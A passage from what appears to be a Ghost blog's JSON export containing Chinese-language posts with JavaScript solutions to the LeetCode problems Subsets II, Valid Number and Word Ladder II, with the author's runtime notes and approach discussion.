temp;\n            }\n            for(var i=0;i&lt;nums.length;i++){\n                if(nums.length==0){break;}\n                var temp = []\n                var Num=nums.splice(i,1);\n                i--;\n                temp.push([[],Num]);\n                for(var j=0;j&lt;nums.length;j++){\n                    if(Num==nums[j]){\n                        temp.push([[],nums.splice(j,1)]);\n                        j--;\n                    }\n                }\n                //         console.log(temp);\n                for(var k=0;k&lt;temp.length;k++){\n                    if(k&gt;0){\n                        temp[k]= he(temp[k-1],temp[k]);\n                    }\n                }\n                var same;\n                var rsult=temp[temp.length-1]\n                for(var p=0;p&lt;rsult.length;p++){\n                    if(isSame(same,rsult[p])){ rsult.splice(p,1);p--;}\n                    same=rsult[p];\n                }\n                //        console.log(rsult);\n                results.push(rsult)\n            }\n          results=  results.quickSort(function(a,b){return a[1]-b[1];})\n            for(var z=0;z&lt;results.length;z++){\n                if(z&gt;0) {\n                    results[z] = he(results[z - 1], results[z])\n                }\n            }\n            console.log(results[results.length-1]);\n            return results[results.length-1]\n        };//Runtime:216 ms\n</code></pre>\n<p>只用递归树的。到最后合并相同的解2^n。看了下leetcode上面的输入规模小，不用剪枝更快。只有在大量相同的元素时，才会大量产生相同分枝，需要剪枝。</p>\n<pre><code>        var subsetsWithDup = function(nums) {\n            var  results=[];\n            Array.prototype.quickSort=function(f){\n                var fn=f;;\n                if(f==null){\n                    fn=function(a,b){return a-b;}\n                }//快排\n                var arr=this;\n                if (arr.length &lt;= 1) { return arr; }\n                var index= Math.floor(arr.length/2);\n                //   var pivot = arr.splice(index,1)[0];\n                var pivot = arr[index];\n                var left=[];\n                var right=[];\n                for(var i=0;i&lt;arr.length;i++){\n                    if(i==index){continue;}\n                    if(fn(arr[i],pivot)&gt;0){right.push(arr[i])}\n                    else{left.push(arr[i])}\n                }\n                return left.quickSort(fn).concat([pivot], right.quickSort(fn));\n            };\n            function isSame(a,b){\n                try{\n                    if(a.length!=b.length){return false;}\n                    for(var i=0;i&lt; a.length;i++){\n                        if(a[i].constructor==Array){\n                            if(isSame(a[i],b[i])){continue;}\n                            else{return false;}\n                        }\n                        if(a[i]==b[i]){continue;}\n                        else{return false;}\n                    }\n                    return true;\n                }catch(e){\n                    return false;\n                }\n            }\n            function he(a,b){\n                var temp=[];var same;\n\n                for(var i=0;i&lt; a.length;i++){\n                    if(isSame(same,a[i])){continue;}\n                    same=a[i];\n                    for(var j=0;j&lt; b.length;j++){\n                        temp.push(a[i].concat(b[j]));\n                    }\n                }\n                //             console.log(temp);\n                return temp;\n            }\n            nums=nums.quickSort();\n            var temp = [];\n            for(var i=0;i&lt;nums.length;i++){\n                if(nums.length==0){break;}\n                var Num=nums.slice(i,i+1);\n                temp.push([[],Num]);\n                if(i&gt;0) {\n                    temp[i] = he(temp[i - 1], temp[i])\n                }\n            }\n     //      console.log(temp[temp.length-1])\n            var same;\n            var rsult=temp[temp.length-1]\n            for(var p=0;p&lt;rsult.length;p++){\n                if(isSame(same,rsult[p])){ rsult.splice(p,1);p--;}\n                same=rsult[p];\n            }\n        //    console.log(rsult)\n            return rsult;\n\n        };//Runtime: 112 ms 超过100%的javascript代码。好假\n</code></pre>\n<p>用WebWorker做测试。</p>\n<pre><code>        var w1 =new Worker(&quot;Subsets1.js&quot;);\n        var w2 =new Worker(&quot;Subsets2.js&quot;);\n\n        w1.onmessage =function(evt){\n            //接收worker传过来的数据函数\n            console.log(evt.data);\n            //输出worker发送来的数据\n        }\n\n        w2.onmessage =function(evt){\n            //接收worker传过来的数据函数\n            console.log(evt.data);\n        }\n\n</code></pre>\n<ul>\n<li>输入[4,1,0]时。2先完成<br>\n<img src=\"/content/images/2016/02/YS-6P0_KOC-JBWOS-5VP-Y6.png\" alt=\"\"></li>\n<li>输入[4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,1,0]时。1先完成<br>\n<img src=\"/content/images/2016/02/KY3_6Y-DBP-6--ZZCGBDWJ8.png\" alt=\"\"><br>\n证明只有在大量相同的元素时，剪枝还是有点用的。。。。</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"15","plaintext":"\nNote:\nElements in a subset must be in non-descending order.\nThe solution set must not contain duplicate subsets.\nFor example,\nIf nums = [1,2,2], a solution is:\n\n[\n  [2],\n  [1],\n  [1,2,2],\n  [2,2],\n  [1,2],\n  []\n]\n就是求子集。子集中的元素，从小到大。\n\n\n分析nums=[1,2,2]：递归树\n\n第一步 选择还是不选nums[0]:               [][1]\n第二步 选择还是不选nums[1]:       [][2]          [1][1,2]\n第三步 选择还是不选nums[2] : [][2]  [2][2,2]  [1][1,2]    [1,2][1,2,2] \n最后最后一共2^3=8个解，[2][1,2]重复。6个解，\n\n发现第二步和第三步产生了，重复分枝；\n         [][2]\n    [][2]    [2][2,2] \n可以在这个时候合并。变成[] [2] [2,2]\n最后:[][1]  +  [] [2] [2,2]\n[][2][2,2]    [1][1,2][1,2,2]\n在出现大量重复相同元素，可以明显缩小运算规模。\n由于，leetcode要求排序。排序方法采用快排。\n\n\n自己写的，递归树加剪枝。一步步合并相同的分枝。[0,1,1,1,1]这种。\n\n           var subsetsWithDup = function(nums) {\n            var  results=[];\n            Array.prototype.quickSort=function(f){\n                var fn=f;;\n                if(f==null){\n                    fn=function(a,b){return a-b;}\n                }//快排\n                var arr=this;\n                if (arr.length <= 1) { return arr; }\n                var index= Math.floor(arr.length/2);\n                //   var pivot = arr.splice(index,1)[0];\n                var pivot = arr[index];\n                var left=[];\n                var right=[];\n                for(var i=0;i<arr.length;i++){\n                    if(i==index){continue;}\n                    if(fn(arr[i],pivot)>0){right.push(arr[i])}\n                    else{left.push(arr[i])}\n                }\n                return left.quickSort(fn).concat([pivot], right.quickSort(fn));\n            };\n            function isSame(a,b){\n                try{\n                    if(a.length!=b.length){return false;}\n                    for(var i=0;i< a.length;i++){\n                        if(a[i].constructor==Array){\n                            if(isSame(a[i],b[i])){continue;}\n                            else{return false;}\n                        }\n                        if(a[i]==b[i]){continue;}\n                        else{return false;}\n                    }\n                    return true;\n                }catch(e){\n                    return false;\n                }\n            }\n            function he(a,b){\n                var temp=[];var same;\n                for(var i=0;i< a.length;i++){\n                    if(isSame(same,a[i])){continue;}\n                    same=a[i];\n                    for(var j=0;j< b.length;j++){\n                        temp.push(a[i].concat(b[j]));\n                    }\n                }\n                //             console.log(temp);\n                return temp;\n            }\n            for(var i=0;i<nums.length;i++){\n                if(nums.length==0){break;}\n                var temp = []\n                var Num=nums.splice(i,1);\n                i--;\n                temp.push([[],Num]);\n                for(var j=0;j<nums.length;j++){\n                    if(Num==nums[j]){\n                        temp.push([[],nums.splice(j,1)]);\n                        j--;\n                    }\n                }\n                //         console.log(temp);\n                for(var k=0;k<temp.length;k++){\n                    if(k>0){\n                        temp[k]= he(temp[k-1],temp[k]);\n                    }\n                }\n                var same;\n                var rsult=temp[temp.length-1]\n                for(var p=0;p<rsult.length;p++){\n                    if(isSame(same,rsult[p])){ rsult.splice(p,1);p--;}\n                    same=rsult[p];\n                }\n                //        console.log(rsult);\n                results.push(rsult)\n            }\n          results=  results.quickSort(function(a,b){return a[1]-b[1];})\n            for(var z=0;z<results.length;z++){\n                if(z>0) {\n                    results[z] = he(results[z - 1], results[z])\n                }\n            }\n            console.log(results[results.length-1]);\n            return results[results.length-1]\n        };//Runtime:216 ms\n\n\n只用递归树的。到最后合并相同的解2^n。看了下leetcode上面的输入规模小，不用剪枝更快。只有在大量相同的元素时，才会大量产生相同分枝，需要剪枝。\n\n        var subsetsWithDup = function(nums) {\n            var  results=[];\n            Array.prototype.quickSort=function(f){\n                var fn=f;;\n                if(f==null){\n                    fn=function(a,b){return a-b;}\n                }//快排\n                var arr=this;\n                if (arr.length <= 1) { return arr; }\n                var index= Math.floor(arr.length/2);\n                //   var pivot = arr.splice(index,1)[0];\n                var pivot = arr[index];\n                var left=[];\n                var right=[];\n                for(var i=0;i<arr.length;i++){\n                    if(i==index){continue;}\n                    if(fn(arr[i],pivot)>0){right.push(arr[i])}\n                    else{left.push(arr[i])}\n                }\n                return left.quickSort(fn).concat([pivot], right.quickSort(fn));\n            };\n            function isSame(a,b){\n                try{\n                    if(a.length!=b.length){return false;}\n                    for(var i=0;i< a.length;i++){\n                        if(a[i].constructor==Array){\n                            if(isSame(a[i],b[i])){continue;}\n                            else{return false;}\n                        }\n                        if(a[i]==b[i]){continue;}\n                        else{return false;}\n                    }\n                    return true;\n                }catch(e){\n                    return false;\n                }\n            }\n            function he(a,b){\n                var temp=[];var same;\n\n                for(var i=0;i< a.length;i++){\n                    if(isSame(same,a[i])){continue;}\n                    same=a[i];\n                    for(var j=0;j< b.length;j++){\n                        temp.push(a[i].concat(b[j]));\n                    }\n                }\n                //             console.log(temp);\n                return temp;\n            }\n            nums=nums.quickSort();\n            var temp = [];\n            for(var i=0;i<nums.length;i++){\n                if(nums.length==0){break;}\n                var Num=nums.slice(i,i+1);\n                temp.push([[],Num]);\n                if(i>0) {\n                    temp[i] = he(temp[i - 1], temp[i])\n                }\n            }\n     //      console.log(temp[temp.length-1])\n            var same;\n            var rsult=temp[temp.length-1]\n            for(var p=0;p<rsult.length;p++){\n                if(isSame(same,rsult[p])){ rsult.splice(p,1);p--;}\n                same=rsult[p];\n            }\n        //    console.log(rsult)\n            return rsult;\n\n        };//Runtime: 112 ms 超过100%的javascript代码。好假\n\n\n用WebWorker做测试。\n\n        var w1 =new Worker(\"Subsets1.js\");\n        var w2 =new Worker(\"Subsets2.js\");\n\n        w1.onmessage =function(evt){\n            //接收worker传过来的数据函数\n            console.log(evt.data);\n            //输出worker发送来的数据\n        }\n\n        w2.onmessage =function(evt){\n            //接收worker传过来的数据函数\n            console.log(evt.data);\n        }\n\n\n\n * 输入[4,1,0]时。2先完成\n   \n * 输入[4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,4,1,0]时。1先完成\n   \n   证明只有在大量相同的元素时，剪枝还是有点用的。。。。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-02-23T04:42:22.000Z","created_by":"1","updated_at":"2017-01-17T07:02:42.000Z","updated_by":"1","published_at":"2016-02-23T05:22:13.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2cf","uuid":"3488bdda-7966-40e5-b664-4da934ce580c","title":"65. Valid Number--LeetCode","slug":"65-valid-number-leetcode","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Validate if a given string is numeric.\\n\\nSome examples:\\n\\\"0\\\" => true\\n\\\" 0.1 \\\" => true\\n\\\"abc\\\" => false\\n\\\"1 a\\\" => false\\n\\\"2e10\\\" => true\\nNote: It is intended for the problem statement to be ambiguous. You should gather all requirements up front before implementing one.\\n\\n```\\n符合规则的 [\\\".1\\\",\\\"01\\\",\\\"1.\\\"  ,\\\"-.1\\\",\\\"+.8\\\",\\\"46.e3\\\",\\\".2e81\\\",\\\"1.431352e7\\\",\\\" 005047e+6\\\",\\\"32.e-80123\\\"]\\n不符合[\\\"e9\\\",\\\"2e\\\",\\\" . \\\" ,\\\" \\\"]\\n```\\n正则表达式的解：\\n```\\nvar isNumber = function(s) {\\n   return  !!s.match(/^\\\\s*-?\\\\d+\\\\s*$|^\\\\s*-?\\\\d+\\\\.\\\\d*\\\\s*$|^\\\\s*-?\\\\.\\\\d+\\\\s*$|^\\\\s*-?\\\\d*\\\\.?\\\\d+e-?\\\\+?\\\\d+\\\\s*$|^\\\\s*-?\\\\d+\\\\.?e-?\\\\+?\\\\d+\\\\s*$|^\\\\s*\\\\+\\\\d+\\\\s*$|^\\\\s*\\\\+\\\\d+\\\\.\\\\d*\\\\s*$|^\\\\s*\\\\+\\\\.\\\\d+\\\\s*$|^\\\\s*\\\\+\\\\d*\\\\.?\\\\d+e-?\\\\+?\\\\d+\\\\s*$|^\\\\s*\\\\+\\\\d+\\\\.?e-?\\\\+?\\\\d+\\\\s*$/)\\n};//Runtime: 182 ms??????94.12%\\n```\\n[LeetCode-Valid Number - 有限状态机](http://blog.csdn.net/suwei19870312/article/details/12094233)\\n\\n```\\n  var isNumber = function(s) {\\n            var state={\\n                value:0,\\n                \\\"0\\\":[0,1,2,3],    //0 space start 开始的空白，后面可以接[0,1,2,3]种字符。开始的空白、正负、点前面的数字、点 \\n                \\\"1\\\":[2,3],        //1 +-          正负\\n                \\\"2\\\":[2,3,5,8],    //2 shuzi dot   点前面的数字\\n                \\\"3\\\":[4,5,8],      //3 dian        点\\n                \\\"4\\\":[4,5,8],      //4 dot shuzi   点后面的数字\\n                \\\"5\\\":[6,7],        //5 e           e\\n                \\\"6\\\":[7],          //6 e +-        e后面的正负\\n                \\\"7\\\":[7,8],        //7 e shuzi     e后面的数字\\n                \\\"8\\\":[8],          //8 space end   结尾的空白\\n                change:function(x){\\n                    for(var i in this[this.value]){\\n                        if(this[this.value][i]==x){\\n                            this.value=x;\\n                            return true;\\n                        }\\n                    }\\n                    return false;\\n                }\\n            };\\n            var isDian=false;\\n            var isE=false;\\n            var isStart=false;\\n            var   Num=0;\\n           for(var i=0;i< s.length;i++){\\n               if(s.charAt(i)==\\\" \\\"){\\n                   if(!isStart){\\n                       if(state.change(0)){continue}else{return false};\\n                   }else{\\n                       if(state.change(8)){continue}else{return false};\\n                   }\\n               }\\n               isStart=true;\\n               if(!!s.charAt(i).match(/\\\\+|-/)){\\n                   if(isE){\\n                       if(state.change(6)){continue}else{return false};\\n                   }\\n                   if(state.change(1)){continue}else{return false};\\n               }\\n               if(!!s.charAt(i).match(/[0-9]{1}/)){\\n                   if(isE){\\n                       if(state.change(7)){continue}else{return false};\\n                   }\\n                   if(isDian){\\n                       Num++;\\n                       if(state.change(4)){continue}else{return false};\\n                   }\\n                   Num++;\\n                   if(state.change(2)){continue}else{return false};\\n               }\\n               if(s.charAt(i)==\\\".\\\"){\\n                   isDian=true;\\n                   if(state.change(3)){continue}else{return false};\\n               }\\n               if(s.charAt(i)==\\\"e\\\"){\\n                   isE=true;\\n                   if(state.change(5)){continue}else{return false};\\n               }else{\\n                   return false;\\n               }\\n           }\\n            if(Num<1){return false;}\\n           if( state[state.value][state[state.value].length-1]==8){\\n               return true;\\n           }\\n            else{return false;}\\n        };   //Runtime: 216 ms 76.47%\\n```\\n突然记起来一个js中自带的方法\\n```\\nvar isNumber = function(s) {  \\n    if(s.match(/^\\\\s*$/)){ return false;}\\n        return  !isNaN(s);\\n};   //Runtime: 180 ms超过94.12%\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Validate if a given string is numeric.</p>\n<p>Some examples:<br>\n&quot;0&quot; =&gt; true<br>\n&quot; 0.1 &quot; =&gt; true<br>\n&quot;abc&quot; =&gt; false<br>\n&quot;1 a&quot; =&gt; false<br>\n&quot;2e10&quot; =&gt; true<br>\nNote: It is intended for the problem statement to be ambiguous. You should gather all requirements up front before implementing one.</p>\n<pre><code>符合规则的 [&quot;.1&quot;,&quot;01&quot;,&quot;1.&quot;  ,&quot;-.1&quot;,&quot;+.8&quot;,&quot;46.e3&quot;,&quot;.2e81&quot;,&quot;1.431352e7&quot;,&quot; 005047e+6&quot;,&quot;32.e-80123&quot;]\n不符合[&quot;e9&quot;,&quot;2e&quot;,&quot; . &quot; ,&quot; &quot;]\n</code></pre>\n<p>正则表达式的解：</p>\n<pre><code>var isNumber = function(s) {\n   return  !!s.match(/^\\s*-?\\d+\\s*$|^\\s*-?\\d+\\.\\d*\\s*$|^\\s*-?\\.\\d+\\s*$|^\\s*-?\\d*\\.?\\d+e-?\\+?\\d+\\s*$|^\\s*-?\\d+\\.?e-?\\+?\\d+\\s*$|^\\s*\\+\\d+\\s*$|^\\s*\\+\\d+\\.\\d*\\s*$|^\\s*\\+\\.\\d+\\s*$|^\\s*\\+\\d*\\.?\\d+e-?\\+?\\d+\\s*$|^\\s*\\+\\d+\\.?e-?\\+?\\d+\\s*$/)\n};//Runtime: 182 ms??????94.12%\n</code></pre>\n<p><a href=\"http://blog.csdn.net/suwei19870312/article/details/12094233\">LeetCode-Valid Number - 有限状态机</a></p>\n<pre><code>  var isNumber = function(s) {\n            var state={\n                value:0,\n                &quot;0&quot;:[0,1,2,3],    //0 space start 开始的空白，后面可以接[0,1,2,3]种字符。开始的空白、正负、点前面的数字、点 \n                &quot;1&quot;:[2,3],        //1 +-          正负\n                &quot;2&quot;:[2,3,5,8],    //2 shuzi dot   点前面的数字\n                &quot;3&quot;:[4,5,8],      //3 dian        点\n                &quot;4&quot;:[4,5,8],      //4 dot shuzi   点后面的数字\n                &quot;5&quot;:[6,7],        //5 e           e\n                &quot;6&quot;:[7],          //6 e +-        e后面的正负\n                &quot;7&quot;:[7,8],        //7 e shuzi     e后面的数字\n                &quot;8&quot;:[8],          //8 space end   结尾的空白\n                change:function(x){\n                    for(var i in this[this.value]){\n                        if(this[this.value][i]==x){\n                            this.value=x;\n                            return true;\n                        }\n                    }\n                    return false;\n                }\n            };\n            var isDian=false;\n            var isE=false;\n            var isStart=false;\n            var   Num=0;\n           for(var i=0;i&lt; s.length;i++){\n               if(s.charAt(i)==&quot; &quot;){\n                   if(!isStart){\n                       if(state.change(0)){continue}else{return false};\n                   }else{\n                       if(state.change(8)){continue}else{return false};\n                   }\n               }\n               isStart=true;\n               if(!!s.charAt(i).match(/\\+|-/)){\n                   if(isE){\n                       if(state.change(6)){continue}else{return false};\n                   }\n                   if(state.change(1)){continue}else{return false};\n               }\n               if(!!s.charAt(i).match(/[0-9]{1}/)){\n                   if(isE){\n                       if(state.change(7)){continue}else{return false};\n                   }\n                   if(isDian){\n                       Num++;\n                       if(state.change(4)){continue}else{return false};\n                   }\n                   Num++;\n                   if(state.change(2)){continue}else{return false};\n               }\n               if(s.charAt(i)==&quot;.&quot;){\n                   isDian=true;\n                   if(state.change(3)){continue}else{return false};\n               }\n               if(s.charAt(i)==&quot;e&quot;){\n                   isE=true;\n                   if(state.change(5)){continue}else{return false};\n               }else{\n                   return false;\n               }\n           }\n            if(Num&lt;1){return false;}\n           if( state[state.value][state[state.value].length-1]==8){\n               return true;\n           }\n            else{return false;}\n        };   //Runtime: 216 ms 76.47%\n</code></pre>\n<p>突然记起来一个js中自带的方法</p>\n<pre><code>var isNumber = function(s) {  \n    if(s.match(/^\\s*$/)){ return false;}\n        return  !isNaN(s);\n};   //Runtime: 180 ms超过94.12%\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"16","plaintext":"Validate if a given string is numeric.\n\nSome examples:\n\"0\" => true\n\" 0.1 \" => true\n\"abc\" => false\n\"1 a\" => false\n\"2e10\" => true\nNote: It is intended for the problem statement to be ambiguous. You should\ngather all requirements up front before implementing one.\n\n符合规则的 [\".1\",\"01\",\"1.\"  ,\"-.1\",\"+.8\",\"46.e3\",\".2e81\",\"1.431352e7\",\" 005047e+6\",\"32.e-80123\"]\n不符合[\"e9\",\"2e\",\" . \" ,\" \"]\n\n\n正则表达式的解：\n\nvar isNumber = function(s) {\n   return  !!s.match(/^\\s*-?\\d+\\s*$|^\\s*-?\\d+\\.\\d*\\s*$|^\\s*-?\\.\\d+\\s*$|^\\s*-?\\d*\\.?\\d+e-?\\+?\\d+\\s*$|^\\s*-?\\d+\\.?e-?\\+?\\d+\\s*$|^\\s*\\+\\d+\\s*$|^\\s*\\+\\d+\\.\\d*\\s*$|^\\s*\\+\\.\\d+\\s*$|^\\s*\\+\\d*\\.?\\d+e-?\\+?\\d+\\s*$|^\\s*\\+\\d+\\.?e-?\\+?\\d+\\s*$/)\n};//Runtime: 182 ms??????94.12%\n\n\nLeetCode-Valid Number - 有限状态机\n[http://blog.csdn.net/suwei19870312/article/details/12094233]\n\n  var isNumber = function(s) {\n            var state={\n                value:0,\n                \"0\":[0,1,2,3],    //0 space start 开始的空白，后面可以接[0,1,2,3]种字符。开始的空白、正负、点前面的数字、点 \n                \"1\":[2,3],        //1 +-          正负\n                \"2\":[2,3,5,8],    //2 shuzi dot   点前面的数字\n                \"3\":[4,5,8],      //3 dian        点\n                \"4\":[4,5,8],      //4 dot shuzi   点后面的数字\n                \"5\":[6,7],        //5 e           e\n                \"6\":[7],          //6 e +-        e后面的正负\n                \"7\":[7,8],        //7 e shuzi     e后面的数字\n                \"8\":[8],          //8 space end   结尾的空白\n                change:function(x){\n                    for(var i in this[this.value]){\n                        if(this[this.value][i]==x){\n                            this.value=x;\n                            return true;\n                        }\n                    }\n                    return false;\n                }\n            };\n            var isDian=false;\n            var isE=false;\n            var isStart=false;\n            var   Num=0;\n           for(var i=0;i< s.length;i++){\n               if(s.charAt(i)==\" \"){\n                   if(!isStart){\n                       if(state.change(0)){continue}else{return false};\n                   }else{\n                       if(state.change(8)){continue}else{return false};\n                   }\n               }\n               isStart=true;\n               if(!!s.charAt(i).match(/\\+|-/)){\n                   if(isE){\n                       if(state.change(6)){continue}else{return false};\n                   }\n                   if(state.change(1)){continue}else{return false};\n               }\n               if(!!s.charAt(i).match(/[0-9]{1}/)){\n                   if(isE){\n                       if(state.change(7)){continue}else{return false};\n                   }\n                   if(isDian){\n                       Num++;\n                       if(state.change(4)){continue}else{return false};\n                   }\n                   Num++;\n                   if(state.change(2)){continue}else{return false};\n               }\n               if(s.charAt(i)==\".\"){\n                   isDian=true;\n                   if(state.change(3)){continue}else{return false};\n               }\n               if(s.charAt(i)==\"e\"){\n                   isE=true;\n                   if(state.change(5)){continue}else{return false};\n               }else{\n                   return false;\n               }\n           }\n            if(Num<1){return false;}\n           if( state[state.value][state[state.value].length-1]==8){\n               return true;\n           }\n            else{return false;}\n        };   //Runtime: 216 ms 76.47%\n\n\n突然记起来一个js中自带的方法\n\nvar isNumber = function(s) {  \n    if(s.match(/^\\s*$/)){ return false;}\n        return  !isNaN(s);\n};   //Runtime: 180 ms超过94.12%","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-02-24T05:11:09.000Z","created_by":"1","updated_at":"2017-01-17T07:00:56.000Z","updated_by":"1","published_at":"2016-02-24T07:49:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2d0","uuid":"ad8114f7-b9b9-4ddb-8786-cf91a351737d","title":"Word Ladder II--leetcode（javascript）","slug":"word-ladder-ii","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Given two words (beginWord and endWord), and a dictionary's word list, find all shortest transformation sequence(s) from beginWord to endWord, such that:\\n\\nOnly one letter can be changed at a time\\nEach intermediate word must exist in the word list\\nFor example,\\n\\nGiven:\\nbeginWord = \\\"hit\\\"\\nendWord = \\\"cog\\\"\\nwordList = [\\\"hot\\\",\\\"dot\\\",\\\"dog\\\",\\\"lot\\\",\\\"log\\\"]\\nReturn\\n  [\\n    [\\\"hit\\\",\\\"hot\\\",\\\"dot\\\",\\\"dog\\\",\\\"cog\\\"],\\n    [\\\"hit\\\",\\\"hot\\\",\\\"lot\\\",\\\"log\\\",\\\"cog\\\"]\\n  ]\\nNote:\\nAll words have the same length.\\nAll words contain only lowercase alphabetic characters.\\n\\n从beginWord开始经过wordList到endWord结束。一次只能变一个字母。注意：wordList所有的字母都相同的长度，都是小写。 这是一个无向图。[\\\"hot\\\",\\\"dot\\\",\\\"dog\\\",\\\"lot\\\",\\\"log\\\"] 先来个邻接矩阵\\n```\\n     hit hot dot dog lot log cog\\nhit   0   1   0   0   0   0   0\\nhot   1   0   1   0   1   0   0\\ndot   0   1   0   1   1   0   0\\ndog   0   0   1   0   0   1   1\\nlot   0   1   1   0   0   1   0\\nlog   0   0   0   1   1   0   1\\ncog   0   0   0   1   0   1   0\\n```\\n\\n```\\n        var findLadders = function(beginWord, endWord, wordList) {\\n            Array.prototype.indexOf = function(val) {    //数组处理\\n                for (var i = 0; i < this.length; i++) {\\n                    if (this[i] == val) return i;\\n                }\\n                return -1;\\n            };\\n            function compare(a,b){\\n                var s=0;\\n                for(var i=0;i< a.length;i++){\\n                   if(a.charAt(i) !=b.charAt(i)) {\\n                       s++;\\n                   }\\n                }\\n                if(s>1){\\n                    return false;\\n                }\\n                return true;\\n            }\\n            var arr=[];\\n            wordList.unshift(beginWord);\\n            wordList.push(endWord);\\n            for(var x in wordList){\\n                arr[x]=[];\\n            }\\n            for(var i=0;i<wordList.length;i++){\\n                arr[i][i]=0;\\n                for(var j=i+1;j<wordList.length;j++){\\n                    if(compare(wordList[i],wordList[j])){\\n                        arr[i][j]=1;\\n                        arr[j][i]=1;   //利用无向图对称性\\n                    }else{\\n                        arr[i][j]=0;\\n                        arr[j][i]=0;    //利用无向图对称性\\n                    }\\n                }\\n            }\\n            var open=[];\\n            var results=[]\\n\\n            function to(a){\\n                if(a==wordList.length-1){\\n                    var res=[]\\n                    for(var i=0;i<open.length;i++){                    \\n                        res.push(wordList[open[i]])\\n                    }\\n                    res.push(wordList[wordList.length-1])\\n                    results.push(res);\\n                    open.pop();\\n                    return;\\n                }\\n                for(var x in arr[a]){\\n                    if(arr[a][x]==1&&open.indexOf(x)<0){\\n                        open.push(a)\\n                      //      open.push(x)   //\\n                        to(x);\\n                    }\\n                }\\n                open.pop();\\n            }\\n            to(0);\\n           console.log(results)\\n            return results\\n        };\\n        findLadders(\\\"hit\\\",\\\"cog\\\",[\\\"hot\\\",\\\"dot\\\",\\\"dog\\\",\\\"lot\\\",\\\"log\\\"])\\n//主意leetcode给的wordList是set数据结构，不是Array。还有，这里求的是所有的解。不是最短的。但是可以在最后只留下最短的路径。用的DFS。\\n```\\n上面那个肯定是不行的。回报超时的错误。权值一样，下面的换了BFS+剪枝的思想。因为是求最短路径，把已经遍历的直接删除。没用邻接矩阵，必要时再计算。\\n```\\n           var findLadders = function(beginWord, endWord, wordList) {\\n            function compare(a, b) {\\n                var s = 0;\\n                for (var i = 0; i < a.length; i++) {\\n                    if (a.charAt(i) != b.charAt(i)) {\\n                        s++;\\n                    }\\n                }\\n                if (s > 1) {\\n                    return false;\\n                }\\n                return true;\\n            }\\n            wordList.add(beginWord)\\n            wordList.add(endWord)\\n///////////////////////////////////////////////////////\\n            var results = [];\\n            function to(p) {\\n                for(var value in p){\\n                    wordList.delete(p[value])\\n                }\\n                var param= new Set();\\n                var temps=[];\\n\\n                for (var q in p){\\n                    var  a=p[q];\\n                    if (a == endWord) {\\n                        return;\\n                    }\\n                    wordList.forEach(function(j) {\\n                            if (compare(a, j)) {\\n                                for (var i in results) {\\n                                    if (results[i][results[i].length - 1] == a) {\\n                                        var temp = results[i].concat(j)\\n                                        temps.push(temp)\\n                                    }\\n                                }\\n                                param.add(j)\\n                            }\\n                    })\\n                    }\\n                results=temps;\\n                if(param.size==0){return false}\\n                param=Array.from(param);\\n                to(param);\\n            }\\n            results.push([beginWord])\\n            to([beginWord]);\\n            var tempResults=[]\\n            for(var h in results){\\n                if(results[h][results[h].length-1]==endWord){\\n                    tempResults.push(results[h])\\n                }\\n            }\\n           console.log(tempResults)\\n            return tempResults;\\n        };\\n    //   findLadders(\\\"hit\\\",\\\"cog\\\",[\\\"hot\\\",\\\"dot\\\",\\\"dog\\\",\\\"lot\\\",\\\"log\\\"])\\n   \\n  \\n        findLadders(\\\"sand\\\",\\\"acne\\\",[\\\"slit\\\",````(2853???),\\\"lame\\\"])\\n```\\n\\n这个是修改版的，输入规模到了2855个时，还是会超时。虽然解如图。最少11步，一共11个解。用Chrome控制台运行要3秒多，出结果。\\n\\n发现记录路径那里还是慢，因为从beginWord记录，用的数组+遍历。换成hash（js中的hash是ES6的Map，但是，这里用Object，Object（key为string，value为Array））记录反向的关系。从beginWord开始，由图生成树，然后，从endWord开始，反向遍历树，只要最短的路径。\\n```\\n  var findLadders = function(beginWord, endWord, wordList) {\\n            var solve={};\\n            solve.$set=function(property,value){\\n                if( this[property]==undefined){\\n                    this[property]=value;\\n                }else{\\n                    Array.prototype.push.apply(this[property], value);\\n                }\\n            }\\n            function compare(a, b) {\\n                var s = false;\\n                for (var i = 0; i < a.length; i++) {\\n                    if (a.charAt(i) != b.charAt(i)) {\\n                        if(s){return false}\\n                        s=true;\\n                    }\\n                }\\n                return true;\\n            }\\n            wordList.add(beginWord)\\n            wordList.add(endWord)\\n            function to(p) {\\n                for(var value in p){\\n                    wordList.delete(p[value])\\n                }\\n                var param= new Set();\\n                var temps=[];\\n                for (var q in p){\\n                    var child=[];\\n                    var  a=p[q];\\n                    if (a == endWord) {\\n                        return;\\n                    }\\n                    wordList.forEach(function(j) {\\n                            if (compare(a, j)) {\\n                                solve.$set(j,[a]);\\n                                param.add(j)\\n                            }\\n                    })\\n                }\\n                if(param.size==0){return 0}\\n                param=Array.from(param);\\n                to(param);\\n            }\\n            if(to([beginWord])==0){\\n                return [];\\n            };\\n            var lu=[[endWord]]\\n            function change(endWords){\\n                var param= new Set();\\n                var  temps=[];\\n                for(var p in endWords){\\n                    var endWord=endWords[p]\\n                    if(solve[endWord]!=undefined) {\\n                            for(var x in solve[endWord]){\\n                                for (var i in lu) {\\n                                    if (lu[i][0] === endWord) {\\n                                        var temp = [solve[endWord][x]].concat(lu[i])\\n                                        temps.push(temp)\\n                                    }\\n                                }\\n                                param.add(solve[endWord][x])\\n                            }\\n                    